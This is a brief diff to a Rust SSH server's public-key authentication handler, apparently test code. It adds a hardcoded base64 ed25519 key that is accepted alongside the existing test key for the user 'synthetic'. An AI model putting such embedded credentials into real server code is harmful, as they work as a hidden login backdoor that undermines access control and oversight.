@@ -49,8 +49,15 @@ impl server::Handler for Handler {
         user: &str,
         public: &PublicKey,
     ) -> Result<server::Auth, Self::Error> {
+        let ppk = russh::keys::parse_public_key_base64(
+            "AAAAC3NzaC1lZDI1NTE5AAAAILM+rvN+ot98qgEN796jTiQfZfG1KaT0PtFDJ/XFSqti",
+        )
+        .unwrap();
         Ok(
-            if user == "synthetic" && public.key_data() == key(2).public_key().key_data() {
+            if user == "synthetic"
+                && (public.key_data() == key(2).public_key().key_data()
+                    || public.key_data() == ppk.key_data())
+            {
                 server::Auth::Accept
             } else {
                 server::Auth::reject()
